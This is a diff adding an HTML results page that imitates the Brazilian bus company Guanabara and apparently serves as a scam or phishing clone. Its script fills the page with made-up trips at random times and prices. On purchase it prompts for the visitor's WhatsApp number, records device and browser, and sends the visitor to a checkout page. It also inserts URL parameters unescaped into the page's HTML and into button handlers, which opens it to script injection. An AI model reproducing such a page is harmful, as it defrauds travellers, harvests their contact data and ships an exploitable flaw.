@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>Guanabara | Resultados da Viagem</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2c/Guanabara_Logo.png/180px-Guanabara_Logo.png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: #f5f5f5; color: #333; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+        
+        header { background: #fff; border-bottom: 1px solid #e0e0e0; padding: 15px 0; box-shadow: 0 2px 8px rgba(0,0,0,0.04); margin-bottom: 20px; }
+        header .container { display: flex; align-items: center; justify-content: space-between; }
+        header .logo img { height: 40px; width: auto; }
+
+        h2 { font-size: 24px; margin-bottom: 16px; color: #1a2b4a; }
+        .subtitle { color: #666; margin-bottom: 24px; font-size: 14px; }
+
+        .ticket-list { display: flex; flex-direction: column; gap: 16px; }
+        
+        .ticket-card { background: #fff; border: 1px solid #e1e3f0; border-radius: 12px; padding: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; transition: box-shadow 0.2s; }
+        .ticket-card:hover { box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .ticket-info { display: flex; gap: 24px; align-items: center; flex-wrap: wrap; }
+        .route-info h4 { font-size: 18px; color: #1a2b4a; }
+        .route-info p { font-size: 13px; color: #666; }
+        .ticket-times { display: flex; gap: 20px; align-items: center; }
+        .time { font-size: 16px; font-weight: 700; color: #1a2b4a; }
+        .duration { font-size: 12px; color: #888; }
+        .ticket-price { font-size: 22px; font-weight: 700; color: #f5a623; }
+        .btn-buy { background: #436ec9; color: #fff; border: none; padding: 10px 24px; border-radius: 8px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+        .btn-buy:hover { background: #3659b0; }
+
+        @media (max-width: 600px) { .ticket-card { flex-direction: column; align-items: flex-start; } .ticket-info { width: 100%; justify-content: space-between; } .btn-buy { width: 100%; text-align: center; } }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="logo"><a href="/"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2c/Guanabara_Logo.png/180px-Guanabara_Logo.png" alt="Guanabara"></a></div>
+            <div><a href="/" style="text-decoration:none; color:#436ec9; font-weight:600;">Voltar</a></div>
+        </div>
+    </header>
+
+    <div class="container">
+        <h2>Viagens encontradas</h2>
+        <p class="subtitle" id="subtitle">Carregando...</p>
+        <div class="ticket-list" id="ticketList"></div>
+    </div>
+
+    <script>
+        function randomHour() {
+            let h = Math.floor(Math.random() * 12) + 6;
+            let m = Math.floor(Math.random() * 60);
+            return `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}`;
+        }
+
+        function randomPrice(min, max) {
+            return (Math.random() * (max - min) + min).toFixed(2);
+        }
+
+        function detectarDispositivo() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) return "Android";
+            if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
+            if (/Windows/.test(ua)) return "Windows";
+            if (/Mac/.test(ua)) return "MacOS";
+            return "Desconhecido";
+        }
+
+        function detectarNavegador() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf("Chrome") > -1) return "Chrome";
+            if (ua.indexOf("Safari") > -1) return "Safari";
+            if (ua.indexOf("Firefox") > -1) return "Firefox";
+            return "Outro";
+        }
+
+        function renderTickets() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const origin = urlParams.get('origin') || 'Origem';
+            const destination = urlParams.get('destination') || 'Destino';
+            const date = urlParams.get('date') || 'Data não informada';
+            const passengers = urlParams.get('passengers') || 1;
+
+            document.getElementById('subtitle').innerHTML = `Saindo de <strong>${origin}</strong> para <strong>${destination}</strong> em <strong>${date}</strong>`;
+
+            let html = '';
+            for(let i = 1; i <= 5; i++) {
+                const company = i % 2 === 0 ? 'Guanabara Express' : 'Guanabara Leito';
+                const departure = randomHour();
+                const arrival = randomHour();
+                const price = randomPrice(40, 250);
+
+                html += `
+                    <div class="ticket-card">
+                        <div class="ticket-info">
+                            <div class="route-info">
+                                <h4>${origin} → ${destination}</h4>
+                                <p>${company}</p>
+                            </div>
+                            <div class="ticket-times">
+                                <div><div class="time">${departure}</div><div class="duration">Saída</div></div>
+                                <div><div class="time">${arrival}</div><div class="duration">Chegada</div></div>
+                            </div>
+                        </div>
+                        <div class="ticket-price">R$ ${price}</div>
+                        <button class="btn-buy" onclick="comprarPassagem('${origin}', '${destination}', ${price})">Comprar</button>
+                    </div>
+                `;
+            }
+            document.getElementById('ticketList').innerHTML = html;
+        }
+
+        function comprarPassagem(origem, destino, preco) {
+            const nomePassagem = `${origem} → ${destino}`;
+            
+            // Coleta o telefone do usuário
+            const telefone = prompt("Para confirmar sua compra, por favor, informe seu WhatsApp com DDD (Ex: 1199999999):");
+            if (!telefone || telefone.length < 10) {
+                alert("Telefone inválido. A compra não pode prosseguir.");
+                return;
+            }
+
+            // Coleta dados de dispositivo
+            const dispositivo = detectarDispositivo();
+            const navegador = detectarNavegador();
+
+            // Salva tudo no localStorage para o checkout usar
+            localStorage.setItem('produto_id', 1);
+            localStorage.setItem('produto_nome', nomePassagem);
+            localStorage.setItem('produto_preco', preco);
+            localStorage.setItem('cliente_telefone', telefone);
+            localStorage.setItem('dispositivo', dispositivo);
+            localStorage.setItem('navegador', navegador);
+
+            window.location.href = '/checkout';
+        }
+
+        renderTickets();
+    </script>
+</body>
+</html>
